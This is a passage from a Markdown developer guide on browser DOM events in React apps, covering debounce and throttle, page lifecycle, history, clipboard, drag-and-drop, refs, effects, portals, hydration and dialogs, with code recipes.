// ── Breaking up long work so clicks stay responsive (INP) ───────────────────
async function processAll(items) {
  for (let i = 0; i < items.length; i++) {
    process(items[i]);
    if (i % 100 === 0) {
      // Give the browser a chance to handle input and paint
      await (globalThis.scheduler?.yield?.() ?? new Promise(r => setTimeout(r, 0)));
    }
  }
}
// A task over 50ms is a "long task". Anything that blocks the main thread delays
// every click and key press on the page.
```

---

## 20. Debounce and Throttle for DOM Events

```text
‼️ DEBOUNCE = wait until the events STOP for N ms, then run once.
     typing in a search box → fetch 300ms after the last keystroke
     window resize → recompute once the user stops dragging
     autosave a form

   THROTTLE = run at most once every N ms while events keep coming.
     scroll position tracking, pointermove, analytics heartbeat
     rAF-throttle (once per frame) is the best throttle for anything visual.

   Timeline of 10 rapid events:
     events:    | | | | | | | | | |
     debounce:                       X        (once, after the pause)
     throttle:  X     X     X     X           (steady rate)
```

```js
function debounce(fn, ms) {
  let id;
  const debounced = (...args) => {
    clearTimeout(id);                    // every call resets the timer
    id = setTimeout(() => fn(...args), ms);
  };
  debounced.cancel = () => clearTimeout(id);   // ‼️ call on unmount
  return debounced;
}

function rafThrottle(fn) {
  let frame = 0, lastArgs;
  const throttled = (...args) => {
    lastArgs = args;                     // always use the newest event
    if (frame) return;                   // already scheduled for this frame
    frame = requestAnimationFrame(() => { frame = 0; fn(...lastArgs); });
  };
  throttled.cancel = () => cancelAnimationFrame(frame);
  return throttled;
}

window.addEventListener('scroll', rafThrottle(() => updateProgress(window.scrollY)),
                        { passive: true });
```

```jsx
// ‼️ React: a debounced function must be created ONCE, not on every render.
// Creating it in the component body makes a new timer each render → never debounces.
function Search() {
  const [query, setQuery] = useState('');
  const [results, setResults] = useState([]);

  // useMemo keeps the same debounced instance across renders
  const search = useMemo(() => debounce(async (q) => {
    setResults(await api.search(q));
  }, 300), []);
  useEffect(() => () => search.cancel(), [search]);   // cancel on unmount

  return <input value={query} onChange={(e) => {
    setQuery(e.target.value);      // the input updates immediately (controlled)
    search(e.target.value);        // the fetch is debounced
  }} />;
}

// Often cleaner: debounce the VALUE, and let an effect / TanStack Query react to it.
function useDebouncedValue(value, ms) {
  const [debounced, setDebounced] = useState(value);
  useEffect(() => {
    const id = setTimeout(() => setDebounced(value), ms);
    return () => clearTimeout(id);   // each new value clears the previous timer
  }, [value, ms]);
  return debounced;
}
// const q = useDebouncedValue(query, 300); useQuery({ queryKey: ['search', q], ... })
// Also consider useDeferredValue for "keep typing smooth while a heavy list re-renders" —
// it's not a debounce (no delay, no fewer fetches), it lowers the render priority.
```

Implementations to practise for interviews: [JS-INTERVIEW-LIVE-CODING.md](JS-INTERVIEW-LIVE-CODING.md#1-debounce).

---

## 21. Page Lifecycle and Window Events

```text
‼️ LOADING ORDER

  1. HTML parsing starts            document.readyState === 'loading'
     - <script> (no attrs) BLOCKS parsing until downloaded + run
     - <script defer>  downloads in parallel, runs after parsing, in order
     - <script async>  downloads in parallel, runs whenever ready, any order
     - <script type="module"> is deferred by default
  2. Parsing done, deferred scripts run
     → 'DOMContentLoaded' on document     readyState === 'interactive'
       ‼️ the DOM is complete; images/fonts/iframes may still be loading
  3. Everything loaded (images, styles, iframes)
     → 'load' on window                   readyState === 'complete'

  In a Vite/CRA React app your bundle is a module script → the DOM already exists when
  it runs. You never need DOMContentLoaded inside React components.
```

```js
// Run when the DOM is ready, even if this script loads late
function onReady(fn) {
  if (document.readyState !== 'loading') fn();
  else document.addEventListener('DOMContentLoaded', fn, { once: true });
}
```

```text
‼️ LEAVING / HIDING THE PAGE

  visibilitychange  document.visibilityState 'hidden' | 'visible'
                    fires when switching tabs, minimizing, locking the phone, and
                    BEFORE the page is closed. ‼️ The most reliable "user is leaving"
                    signal, especially on mobile. Pause video, stop polling, save drafts,
                    flush analytics here.
  pagehide/pageshow fire on navigation away/back. e.persisted === true means the page
                    went into / came back from the back-forward cache (bfcache) —
                    JS state is intact, but timers/sockets were frozen.
  beforeunload      lets you show "Leave site? Changes may not be saved."
                    Only for genuinely unsaved changes. Add it while dirty, remove
                    it once saved (it can disable bfcache).
  unload            ❌ deprecated: unreliable on mobile and blocks bfcache. Use pagehide.

  Sending data on exit: navigator.sendBeacon(url, data) or
                        fetch(url, { method: 'POST', body, keepalive: true }).
                        A normal fetch can be cancelled when the page goes away.
```

```js
// Warn about unsaved changes
function onBeforeUnload(e) {
  e.preventDefault();          // modern way to trigger the prompt
  e.returnValue = '';          // legacy browsers need this
}
if (isDirty) window.addEventListener('beforeunload', onBeforeUnload);
else window.removeEventListener('beforeunload', onBeforeUnload);
// The browser shows its own generic message; custom text is ignored.
// In-app (SPA) navigation doesn't fire beforeunload — use your router's blocker
// (React Router's useBlocker).

// Pause work while hidden
document.addEventListener('visibilitychange', () => {
  if (document.hidden) stopPolling(); else startPolling();
});

// Refresh state when coming back from bfcache
window.addEventListener('pageshow', (e) => {
  if (e.persisted) refetchUser();
});
```

| Window event | When | Typical use |
|---|---|---|
| `online` / `offline` | network connectivity changes (`navigator.onLine`) | show "You're offline" banner, retry queue |
| `storage` | ‼️ **another tab** changed localStorage | sync logout / theme across tabs |
| `focus` / `blur` (window) | tab/window gained or lost focus | refetch on focus (TanStack Query does this) |
| `error` | uncaught exception (also resource load errors in capture phase) | error reporting |
| `unhandledrejection` | a Promise rejected with no `.catch` | error reporting |
| `hashchange` | `#fragment` changed | old hash routers |
| `popstate` | back/forward between history entries | routers (§22) |
| `message` | `postMessage` from iframe/popup/worker | ‼️ always check `e.origin` |
| `copy` / `paste` | clipboard (on document) | §23 |
| `beforeprint` / `afterprint` | print dialog | expand collapsed content |
| `languagechange` | user changed browser language | |

```js
window.addEventListener('message', (e) => {
  if (e.origin !== 'https://trusted.example.com') return;   // ‼️ never skip this
  handle(e.data);
});

window.addEventListener('error', (e) => report(e.error ?? e.message));
window.addEventListener('unhandledrejection', (e) => report(e.reason));
// Note: React error boundaries only catch errors during rendering — not in event
// handlers or async code. These window listeners catch the rest.
```

---

## 22. URL, History, and Navigation

```js
// ── Reading the URL ─────────────────────────────────────────────────────────
location.href;       // "https://app.com/tasks/7?tab=notes#top"
location.origin;     // "https://app.com"
location.pathname;   // "/tasks/7"
location.search;     // "?tab=notes"
location.hash;       // "#top"

const params = new URLSearchParams(location.search);
params.get('tab');            // "notes"  (null if missing)
params.getAll('tag');         // repeated keys ?tag=a&tag=b
params.set('page', '2');      // values are strings
params.toString();            // "tab=notes&page=2" — encoding done for you

const url = new URL('/api/tasks', location.origin);   // ‼️ build URLs, don't concat strings
url.searchParams.set('q', 'milk & eggs');             // safely encoded
fetch(url);

// ── Changing it ─────────────────────────────────────────────────────────────
location.assign('/login');        // navigate (adds history entry) — full page load
location.replace('/login');       // navigate without a history entry (redirects)
location.reload();

history.pushState(state, '', '/tasks/8');     // change URL, NO page load, adds entry
history.replaceState(state, '', '?tab=files');// change URL, no new entry
history.back(); history.forward(); history.go(-2);

window.addEventListener('popstate', (e) => {
  // ‼️ fires on back/forward ONLY — not when you call pushState/replaceState yourself
  render(location.pathname, e.state);
});
```

```text
React Router / Next.js / TanStack Router wrap exactly these APIs. Inside a router app:
  - navigate with <Link> / navigate() — not location.href (full reload, state lost)
  - read params with useSearchParams / useParams — they re-render on change,
    while reading location directly does not
  - window.location is still fine for full-page redirects (logout, external sites)

The Navigation API (window.navigation, 'navigate' event) is a cleaner successor to
history + popstate for SPAs. Shipped in Chromium first; check support before relying on it.
```

---

## 23. Selection, Clipboard, and Drag and Drop

```js
// ── Text selection ──────────────────────────────────────────────────────────
const sel = window.getSelection();
sel.toString();                 // the selected text
sel.rangeCount && sel.getRangeAt(0).getBoundingClientRect();  // where it is → position a
                                                              // "highlight / comment" popup
document.addEventListener('selectionchange', () => { /* selection moved */ });
sel.removeAllRanges();

// Select all text in an element (e.g. "click to select code")
const range = document.createRange();
range.selectNodeContents(codeEl);
sel.removeAllRanges(); sel.addRange(range);

// Inputs have their own selection API
input.select();
input.setSelectionRange(2, 5);
```

```js
// ── Clipboard ───────────────────────────────────────────────────────────────
// ‼️ Async Clipboard API: needs HTTPS (or localhost) and a user gesture; reading also
// needs permission. Call it from a click handler.
async function copy(text) {
  try {
    await navigator.clipboard.writeText(text);
    toast('Copied');
  } catch {
    toast('Copy failed — select and press Ctrl+C');
  }
}
const text = await navigator.clipboard.readText();     // prompts / may be denied

// Clipboard EVENTS — customise what the user copies/pastes
document.addEventListener('copy', (e) => {
  e.clipboardData.setData('text/plain', getSelection() + '\n— from MyApp');
  e.preventDefault();
});
editor.addEventListener('paste', (e) => {
  const files = [...e.clipboardData.files];            // pasted screenshots
  if (files.length) { e.preventDefault(); upload(files); return; }
  const text = e.clipboardData.getData('text/plain');  // paste as plain text
  e.preventDefault();
  document.execCommand('insertText', false, text);     // deprecated but still the
                                                       // practical way in contenteditable
});
```

```text
‼️ HTML5 DRAG AND DROP — the rules people forget

  On the dragged element:   draggable="true"  (links and images are draggable by default)
    dragstart → set data:   e.dataTransfer.setData('text/plain', id)
                            e.dataTransfer.effectAllowed = 'move'
    drag (repeating), dragend (always fires, check dropEffect for success)

  On the drop target:
    dragenter, dragover (repeating), dragleave, drop
    ‼️ You MUST call e.preventDefault() in dragover (and dragenter) or 'drop' never fires
       — the default action of dragover is "dropping is not allowed here".
    ‼️ dataTransfer.getData() returns '' in every event except drop (privacy rule).
       During dragover you can only see e.dataTransfer.types.
    ‼️ dragleave fires when moving onto a CHILD of the target → highlight flickers.
       Count enter/leave, or check e.relatedTarget with contains().

  Files from the desktop: e.dataTransfer.files in 'drop'. Also preventDefault on
  dragover/drop at window level, or a missed drop makes the browser open the file.

  HTML5 DnD is weak for sortable lists (no touch support on some mobile browsers,
  no animation, accessibility work is on you). For sortable UIs use dnd-kit
  or pointer events (§10) — and provide a keyboard alternative.
```

```jsx
function Dropzone({ onFiles }) {
  const [over, setOver] = useState(false);
  const depth = useRef(0);   // counts nested dragenter/dragleave to avoid flicker
  return (
    <div
      className={over ? 'dropzone over' : 'dropzone'}
      onDragEnter={(e) => { e.preventDefault(); depth.current++; setOver(true); }}
      onDragOver={(e) => e.preventDefault()}          // ‼️ required to allow the drop
      onDragLeave={() => { if (--depth.current === 0) setOver(false); }}
      onDrop={(e) => {
        e.preventDefault();                            // stop the browser opening the file
        depth.current = 0; setOver(false);
        onFiles([...e.dataTransfer.files]);
      }}
    >
      Drop files here, or <label>browse<input type="file" multiple hidden
        onChange={(e) => onFiles([...e.target.files])} /></label>
    </div>
  );
}
```

---

## 24. Custom Events

```js
// ── Dispatch your own events on DOM nodes ───────────────────────────────────
const ev = new CustomEvent('cart:updated', {
  detail: { count: 3 },   // your payload lives in .detail
  bubbles: true,          // default false! — set true if ancestors should hear it
  composed: true,         // cross shadow DOM boundaries (web components)
  cancelable: true,       // lets listeners call preventDefault
});
const notCancelled = el.dispatchEvent(ev);   // returns false if a listener preventDefault'ed
// ‼️ dispatchEvent is SYNCHRONOUS — all listeners run before it returns.

document.addEventListener('cart:updated', (e) => updateBadge(e.detail.count));

// ── Simulating user events ──────────────────────────────────────────────────
button.click();                                   // fires a real click (isTrusted: false)
el.dispatchEvent(new MouseEvent('click', { bubbles: true }));
input.dispatchEvent(new Event('input', { bubbles: true }));
el.dispatchEvent(new KeyboardEvent('keydown', { key: 'Escape', bubbles: true }));
// ‼️ Synthetic events run your listeners but do NOT perform default actions:
// a dispatched keydown doesn't type a character, a dispatched click on a file input
// may be blocked. isTrusted is false — browsers gate clipboard, fullscreen,
// popups and audio on trusted user activation.

// ── Your own event emitter on top of EventTarget (no DOM needed) ────────────
class Store extends EventTarget {
  #state = {};
  set(patch) {
    this.#state = { ...this.#state, ...patch };
    this.dispatchEvent(new CustomEvent('change', { detail: this.#state }));
  }
}
const store = new Store();
store.addEventListener('change', (e) => console.log(e.detail));
```

```text
In React, prefer props / context / a store over custom DOM events for app communication.
Custom events are the right tool for: talking to non-React code on the same page,
web components, micro-frontends (see ../3-low-priority/MICRO-FRONTENDS-DEEP.md),
and browser extensions.
```

---

## 25. Refs — Reaching the DOM from React

```jsx
// ── useRef: a box whose .current React fills with the DOM node ──────────────
function SearchBox() {
  const inputRef = useRef(null);     // TS: useRef<HTMLInputElement>(null)
  // During render inputRef.current is null on the first render (the node doesn't exist yet).
  // ‼️ Only read/use it in event handlers and effects — never during render.
  return (
    <>
      <input ref={inputRef} />
      <button onClick={() => inputRef.current?.focus()}>Focus</button>
    </>
  );
}
```

```text
‼️ WHEN .current IS SET
   render → React commits DOM → sets ref.current = node → runs useLayoutEffect
   → paint → runs useEffect
   On unmount React sets ref.current = null.

   So in useLayoutEffect / useEffect the node is ready; in the render body it isn't
   (or it's the PREVIOUS render's node).

   Changing ref.current never re-renders. That's why refs are also used for
   "mutable values that aren't UI": timer ids, latest callback, previous value.
```

```jsx
// ── Callback refs: run code exactly when the node attaches/detaches ─────────
// Use when: the element mounts conditionally/later, you need to know the moment it
// appears, you have a list of nodes, or you need to measure on mount.
function AutoMeasure() {
  const [height, setHeight] = useState(0);
  const measuredRef = useCallback((node) => {
    if (node) setHeight(node.getBoundingClientRect().height);
  }, []);
  return <div ref={measuredRef}>...</div>;
}

// React 19: a ref callback can return a cleanup function (like an effect)
<div ref={(node) => {
  const ro = new ResizeObserver(onResize);
  ro.observe(node);
  return () => ro.disconnect();     // runs when the node detaches
}} />
// ‼️ An inline ref callback is a new function every render → React calls the old one's
// cleanup and the new one each render. Wrap in useCallback if that work is expensive.

// ── Refs to many items ──────────────────────────────────────────────────────
const itemRefs = useRef(new Map());
{items.map(item => (
  <li key={item.id} ref={(node) => {
    if (node) itemRefs.current.set(item.id, node);
    else itemRefs.current.delete(item.id);
  }}>{item.label}</li>
))}
// later: itemRefs.current.get(activeId)?.scrollIntoView({ block: 'nearest' });
```

```jsx
// ── Passing a ref to YOUR component ─────────────────────────────────────────
// React 19: ref is a normal prop for function components
function TextField({ label, ref, ...props }) {
  return <label>{label}<input ref={ref} {...props} /></label>;
}
// React 18 and earlier: wrap in forwardRef
const TextField18 = forwardRef(function TextField({ label, ...props }, ref) {
  return <label>{label}<input ref={ref} {...props} /></label>;
});

// ── Exposing a limited API instead of the raw node ──────────────────────────
function VideoPlayer({ src, ref }) {
  const videoRef = useRef(null);
  useImperativeHandle(ref, () => ({
    play: () => videoRef.current.play(),
    pause: () => videoRef.current.pause(),
    // parent can't do videoRef.current.remove() or change styles — only these
  }), []);
  return <video ref={videoRef} src={src} />;
}
```

```jsx
// ── Wrapping a non-React library (chart, map, rich editor) ──────────────────
function Chart({ data }) {
  const containerRef = useRef(null);
  const chartRef = useRef(null);

  useEffect(() => {                         // create once
    chartRef.current = new ChartLib(containerRef.current);
    return () => { chartRef.current.destroy(); chartRef.current = null; };
  }, []);

  useEffect(() => {                         // push updates
    chartRef.current?.setData(data);
  }, [data]);

  // ‼️ React renders an EMPTY div and never touches its children — the library owns
  // them. Don't put JSX children inside it, or React and the library will fight.
  return <div ref={containerRef} style={{ height: 300 }} />;
}
```

---

## 26. Native Listeners in React — useEffect, Cleanup, Stale State

```jsx
// ── The basic pattern ───────────────────────────────────────────────────────
function useEscape(onEscape) {
  useEffect(() => {
    function onKeyDown(e) {
      if (e.key === 'Escape') onEscape();
    }
    document.addEventListener('keydown', onKeyDown);
    return () => document.removeEventListener('keydown', onKeyDown);
    // ‼️ The cleanup removes the SAME function reference created in this effect run.
  }, [onEscape]);
}
// ‼️ In development StrictMode runs effect → cleanup → effect on mount to prove your
// cleanup works. If you see doubled listeners firing, your cleanup is missing or wrong.
```

```text
‼️ THE STALE CLOSURE PROBLEM

   useEffect(() => {
     function onKey(e) { if (e.key === 'ArrowRight') setIndex(index + 1); }
     window.addEventListener('keydown', onKey);
     return () => window.removeEventListener('keydown', onKey);
   }, []);              ← empty deps: the listener is created ONCE, in the first render,
                          and sees index = 0 forever. Every press sets index to 1.

   Fixes, in order of preference:
   1. Functional update — doesn't need to read the current value:
        setIndex(i => i + 1);
   2. Put the value in deps — the effect re-subscribes when it changes:
        }, [index]);       (fine for cheap listeners)
   3. useEffectEvent (stable in React 19.2) — a function that always sees the latest
      props/state, but isn't a dependency:
        const onKey = useEffectEvent((e) => { if (...) onNext(index); });
        useEffect(() => {
          window.addEventListener('keydown', onKey);
          return () => window.removeEventListener('keydown', onKey);
        }, []);
   4. "Latest ref" pattern (works in any version):
        const handlerRef = useRef(handler);
        useLayoutEffect(() => { handlerRef.current = handler; });
        // listener calls handlerRef.current(e)
```

```jsx
// ── A reusable useEventListener hook ────────────────────────────────────────
function useEventListener(target, type, handler, options) {
  // Keep the newest handler without re-subscribing every render
  const handlerRef = useRef(handler);
  useLayoutEffect(() => { handlerRef.current = handler; });

  // Pull primitives out so a new options object each render doesn't re-subscribe
  const capture = options?.capture ?? false;
  const passive = options?.passive;
  const once = options?.once;

  useEffect(() => {
    // target can be window/document, a ref, or null
    const el = target && 'current' in target ? target.current : target;
    if (!el?.addEventListener) return;
    const controller = new AbortController();
    el.addEventListener(type, (e) => handlerRef.current(e),
      { capture, passive, once, signal: controller.signal });
    return () => controller.abort();          // removes it, no reference juggling
  }, [target, type, capture, passive, once]);
}

// useEventListener(window, 'resize', () => setW(window.innerWidth));
// useEventListener(document, 'keydown', onKey);
// useEventListener(panelRef, 'wheel', onWheel, { passive: false });
// ‼️ With a ref, the effect reads ref.current once at subscribe time. If the element
// mounts later (conditional render), pass the element via state or a callback ref.
```

```text
‼️ REACT HANDLER vs NATIVE LISTENER — which to use

  Element you render in JSX           → JSX prop: onClick, onKeyDown, onScroll...
  window / document / body            → useEffect + addEventListener
  Need { passive: false }             → useEffect + addEventListener on a ref
    (wheel, touchmove preventDefault)
  Need { capture: true } on document  → useEffect + addEventListener
  Element owned by a third-party lib  → useEffect + addEventListener
```

---

## 27. useEffect vs useLayoutEffect, flushSync

```text
‼️ TIMELINE OF ONE UPDATE

  setState → render (your function runs) → commit (DOM updated, refs set)
           → useLayoutEffect  ← runs SYNCHRONOUSLY before the browser paints
           → browser paints   ← user sees the result
           → useEffect        ← runs after paint (usually)

  useEffect        → default. Data fetching, subscriptions, logging, listeners.
                     Doesn't block paint.
  useLayoutEffect  → you must MEASURE the DOM and then change it before the user sees
                     the first version: tooltip/popover positioning, scroll position
                     restore, "auto-size" calculations, anything that would flicker.
                     ‼️ Blocks paint — keep it short. Warns during SSR (runs only on the
                     client).
```

```jsx
// Tooltip that flips above the anchor when there's no room below — no flicker
function Tooltip({ anchorRect, children }) {
  const ref = useRef(null);
  const [placement, setPlacement] = useState('below');

  useLayoutEffect(() => {
    const h = ref.current.getBoundingClientRect().height;   // measure
    const roomBelow = window.innerHeight - anchorRect.bottom;
    setPlacement(roomBelow < h + 8 ? 'above' : 'below');    // re-render BEFORE paint
  }, [anchorRect]);

  const top = placement === 'below' ? anchorRect.bottom + 8 : anchorRect.top - 8;
  return (
    <div ref={ref} role="tooltip" style={{
      position: 'fixed', left: anchorRect.left, top,
      transform: placement === 'above' ? 'translateY(-100%)' : undefined,
    }}>{children}</div>
  );
}
// With useEffect instead, the user would briefly see it below, then it jumps above.
```

```jsx
// ── flushSync: "apply this state to the DOM right now" ──────────────────────
import { flushSync } from 'react-dom';

function Chat() {
  const listRef = useRef(null);
  function send(text) {
    flushSync(() => {
      setMessages(m => [...m, text]);   // React updates the DOM synchronously
    });
    // ‼️ Without flushSync the new message isn't in the DOM yet on this line —
    // state updates are batched and applied after the handler.
    listRef.current.lastElementChild.scrollIntoView({ block: 'end' });
  }
}
// Use rarely — it forces a synchronous render. Alternatives: an effect on [messages],
// or a ref callback on the new item.
```

---

## 28. Portals and Event Bubbling

```jsx
// createPortal renders children into a different DOM node (e.g. document.body)
// so modals/menus/tooltips escape parent overflow:hidden and z-index stacking.
import { createPortal } from 'react-dom';

function Modal({ children }) {
  return createPortal(<div className="modal">{children}</div>, document.body);
}
```

```text
‼️ PORTAL EVENTS BUBBLE THROUGH THE REACT TREE, NOT THE DOM TREE

   <div onClick={() => console.log('parent')}>   ← React parent
     <Modal><button>OK</button></Modal>           ← DOM: button lives in <body>
   </div>

   Clicking OK logs "parent" — React bubbles synthetic events along the COMPONENT tree.
   Native listeners still follow the DOM tree.

   Consequences:
   1. A click inside a portal menu can trigger the parent row's onClick.
      → stopPropagation inside the portal root, or check e.target in the parent.
   2. ‼️ CLICK-OUTSIDE breaks: a native document listener checks
        containerRef.current.contains(e.target)
      — but the portal's DOM is NOT inside the container → "outside" → menu closes
      when you click inside its own submenu.
      → Check every relevant ref (trigger, menu, portal content), or
      → Use React's tree: put onPointerDownCapture on the component root and set a
        flag "this pointerdown came from inside", since that bubbles through portals.
   3. Focus: onBlur on a parent fires when focus moves into the portal, because
      e.currentTarget.contains(e.relatedTarget) is false in the DOM. Same fix.

   The top layer (<dialog>.showModal(), popover) often removes the need for a portal (§31).
```

---

## 29. SSR and Hydration — When window Does Not Exist

```text
‼️ ON THE SERVER (Next.js, Remix/React Router framework, Astro...)

   Your component's render runs in Node: no window, document, localStorage,
   matchMedia, navigator. Touching them during render → "ReferenceError: window is
   not defined".

   Effects (useEffect, useLayoutEffect) do NOT run on the server. That's where browser
   APIs belong.

‼️ HYDRATION MISMATCH

   The first client render must produce the same HTML the server sent. Reading
   browser-only values during render breaks that:

     const isMobile = typeof window !== 'undefined' && window.innerWidth < 768;
     return isMobile ? <Drawer/> : <Sidebar/>;
     // server renders <Sidebar/>, phone renders <Drawer/> → mismatch warning,
     // React patches it, users may see a flash

   Same with Date.now(), Math.random(), localStorage theme, locale formatting.
```

```jsx
// ✅ Render a stable default, switch after mount
function useIsClient() {
  const [isClient, setIsClient] = useState(false);
  useEffect(() => setIsClient(true), []);
  return isClient;
}

// ✅ Or useSyncExternalStore with getServerSnapshot (§16) — React uses the server
//    snapshot during hydration, then re-renders with the real value.

// ✅ For values that legitimately differ (timestamps), silence that one element:
<time suppressHydrationWarning>{new Date().toLocaleTimeString()}</time>

// ✅ Client-only component in Next.js
// const Map = dynamic(() => import('./Map'), { ssr: false });   // inside a Client Component

// ✅ Prefer CSS for layout differences — the HTML is the same, CSS decides:
// <Sidebar className="hidden md:block" /> <Drawer className="md:hidden" />

// Next.js App Router: components that use state, effects, refs or event handlers must
// be Client Components — 'use client' at the top of the file.
```

More: [../2-medium-priority/NEXTJS-DEEP.md](../2-medium-priority/NEXTJS-DEEP.md).

---

## 30. Recipes — Patterns You Build Again and Again

### Click outside to close

```jsx
function useClickOutside(refs, onOutside, enabled = true) {
  const cb = useRef(onOutside);
  useLayoutEffect(() => { cb.current = onOutside; });

  useEffect(() => {
    if (!enabled) return;
    function onPointerDown(e) {
      // ‼️ pointerdown, not click: a click starts inside and may END outside (text
      // selection drag), and click fires after the inside handlers may have unmounted
      // the target. pointerdown also catches touch.
      const inside = refs.some(r => r.current?.contains(e.target));
      if (!inside) cb.current(e);
    }
    // ‼️ capture: true → runs even if something inside the app calls stopPropagation
    document.addEventListener('pointerdown', onPointerDown, true);
    return () => document.removeEventListener('pointerdown', onPointerDown, true);
  }, [enabled, ...refs]);   // refs are stable objects; listed so the lint rule is happy
}

// Pass the trigger too, so clicking the toggle button doesn't close-then-reopen:
// useClickOutside([triggerRef, menuRef], () => setOpen(false), open);
// If the menu is in a portal, menuRef must point at the portal content (§28).
```

### Dropdown / menu (accessible basics)

```jsx
function Menu({ label, items }) {
  const [open, setOpen] = useState(false);
  const [active, setActive] = useState(0);
  const btnRef = useRef(null), menuRef = useRef(null);
  useClickOutside([btnRef, menuRef], () => setOpen(false), open);

  function close() { setOpen(false); btnRef.current?.focus(); }   // ‼️ return focus

  // Focus the menu when it opens so arrow keys go to it
  useEffect(() => { if (open) menuRef.current?.focus(); }, [open]);

  return (
    <div className="menu-root">
      <button ref={btnRef} type="button" aria-haspopup="menu" aria-expanded={open}
        onClick={() => setOpen(o => !o)}
        onKeyDown={(e) => { if (e.key === 'ArrowDown') { e.preventDefault(); setOpen(true); } }}>
        {label}
      </button>
      {open && (
        <ul ref={menuRef} role="menu" tabIndex={-1}
          onKeyDown={(e) => {
            if (e.key === 'Escape') close();
            if (e.key === 'ArrowDown') { e.preventDefault(); setActive(i => (i + 1) % items.length); }
            if (e.key === 'ArrowUp') { e.preventDefault(); setActive(i => (i - 1 + items.length) % items.length); }
            if (e.key === 'Enter') { items[active].onSelect(); close(); }
          }}>
          {items.map((it, i) => (
            <li key={it.id} role="menuitem" aria-selected={i === active}
              onMouseDown={(e) => e.preventDefault()}   // keep focus; avoid blur-before-click (§12)
              onClick={() => { it.onSelect(); close(); }}>
              {it.label}
            </li>
          ))}
        </ul>
      )}
    </div>
  );
}
// For production, use a headless library (Radix, React Aria, Headless UI, Ariakit):
// typeahead, roving focus, submenus, collision-aware positioning and screen reader
// behaviour are a lot of work to get right.
```

### Infinite scroll with IntersectionObserver

```jsx
function InfiniteList({ items, hasMore, loadMore }) {
  const sentinelRef = useRef(null);
  const loadMoreRef = useRef(loadMore);
  useLayoutEffect(() => { loadMoreRef.current = loadMore; });

  useEffect(() => {
    if (!hasMore) return;
    const io = new IntersectionObserver(([entry]) => {
      if (entry.isIntersecting) loadMoreRef.current();
    }, { rootMargin: '400px' });            // start loading before the user reaches the end
    io.observe(sentinelRef.current);
    return () => io.disconnect();
  }, [hasMore]);

  return (
    <ul>
      {items.map(i => <li key={i.id}>{i.title}</li>)}
      {hasMore && <li ref={sentinelRef} aria-hidden="true" />}
    </ul>
  );
}
// Guard against double-loading inside loadMore (ignore while a request is in flight).
// TanStack Query's useInfiniteQuery gives you fetchNextPage + isFetchingNextPage for this.
```

### Keep a chat log pinned to the bottom (unless the user scrolled up)

```jsx
function ChatLog({ messages }) {
  const ref = useRef(null);
  const stick = useRef(true);           // were we at the bottom before this update?

  function onScroll() {
    const el = ref.current;
    stick.current = el.scrollHeight - el.scrollTop - el.clientHeight < 40;
  }
  useLayoutEffect(() => {               // before paint → no visible jump
    if (stick.current) ref.current.scrollTop = ref.current.scrollHeight;
  }, [messages]);

  return <div ref={ref} onScroll={onScroll} style={{ overflowY: 'auto', height: 400 }}>
    {messages.map(m => <p key={m.id}>{m.text}</p>)}
  </div>;
}
```

### Auto-growing textarea

```jsx
function AutoTextarea(props) {
  const ref = useRef(null);
  useLayoutEffect(() => {
    const el = ref.current;
    el.style.height = 'auto';                    // shrink first so it can get smaller
    el.style.height = `${el.scrollHeight}px`;    // then fit the content
  }, [props.value]);
  return <textarea ref={ref} rows={1} {...props} />;
}
// Modern CSS alternative (Chromium today): textarea { field-sizing: content; }
```

### Copy button with feedback

```jsx
function CopyButton({ text }) {
  const [copied, setCopied] = useState(false);
  useEffect(() => {
    if (!copied) return;
    const id = setTimeout(() => setCopied(false), 1500);
    return () => clearTimeout(id);               // ‼️ no setState after unmount
  }, [copied]);
  return (
    <button type="button" onClick={async () => {
      await navigator.clipboard.writeText(text);
      setCopied(true);
    }} aria-live="polite">{copied ? 'Copied' : 'Copy'}</button>
  );
}
```

### Detect when a sticky header is "stuck"

```jsx
// A 1px sentinel just above the sticky header. When it scrolls out of view, the header is stuck.
function StickyHeader({ children }) {
  const sentinel = useRef(null);
  const [stuck, setStuck] = useState(false);
  useEffect(() => {
    const io = new IntersectionObserver(([e]) => setStuck(!e.isIntersecting));
    io.observe(sentinel.current);
    return () => io.disconnect();
  }, []);
  return (<>
    <div ref={sentinel} style={{ height: 1 }} />
    <header className={stuck ? 'header stuck' : 'header'} style={{ position: 'sticky', top: 0 }}>
      {children}
    </header>
  </>);
}
```

### Long-press

```jsx
function useLongPress(onLongPress, ms = 500) {
  const timer = useRef(0);
  const start = (e) => {
    timer.current = window.setTimeout(() => onLongPress(e), ms);
  };
  const cancel = () => clearTimeout(timer.current);
  return {
    onPointerDown: start,
    onPointerUp: cancel,
    onPointerLeave: cancel,
    onPointerCancel: cancel,       // scrolling started
    onContextMenu: (e) => e.preventDefault(),   // mobile long-press opens a menu otherwise
  };
}
// <button {...useLongPress(() => openActions())}>Hold me</button>
```

---

## 31. Dialogs, Popovers, and Positioning

```text
‼️ THE PLATFORM NOW DOES MOST OF A MODAL FOR YOU

  <dialog> + dialog.showModal():
    ✅ renders in the TOP LAYER — above everything, no z-index wars, no portal needed
    ✅ ::backdrop pseudo-element for the overlay
    ✅ the rest of the page becomes inert (no clicks, no Tab, hidden from screen readers)
    ✅ focus moves into the dialog; Escape closes it (fires 'cancel', then 'close')
    ✅ focus returns to the previously focused element on close
    dialog.show()   → non-modal (no backdrop, no inert)
    dialog.close(returnValue)

  popover attribute (Baseline since 2024):
    <button popovertarget="menu">Open</button>
    <div id="menu" popover>...</div>
    ✅ top layer, light dismiss (click outside / Escape closes it), no JS
    'toggle' / 'beforetoggle' events, el.showPopover() / hidePopover() / togglePopover()
    popover="manual" → no light dismiss

  CSS anchor positioning (position-anchor, anchor(), position-try-fallbacks) can place
  a popover next to its trigger and flip it when there's no room — with no JS.
  Support is newer and uneven; check before relying on it. Until then: Floating UI.
```

```jsx
function ConfirmDialog({ open, onClose, onConfirm, children }) {
  const ref = useRef(null);
  useEffect(() => {
    const d = ref.current;
    if (open && !d.open) d.showModal();
    if (!open && d.open) d.close();
  }, [open]);

  return (
    <dialog ref={ref}
      onClose={onClose}                        // Escape and close() both end here
      onClick={(e) => {                        // click on the backdrop closes:
        if (e.target === e.currentTarget) onClose();   // the backdrop click targets <dialog> itself
      }}>
      <form method="dialog">                   {/* ‼️ submitting closes the dialog, no JS */}
        {children}
        <button value="cancel" formNoValidate>Cancel</button>
        <button value="ok" onClick={onConfirm}>OK</button>
      </form>
    </dialog>
  );
}
// Backdrop click caveat: if the dialog itself has no padding, clicks on its padding
// area also target <dialog>. Wrap the content in an inner element that fills it.
// Combine with scroll lock if the page behind can still scroll on your target browsers.
```

```text
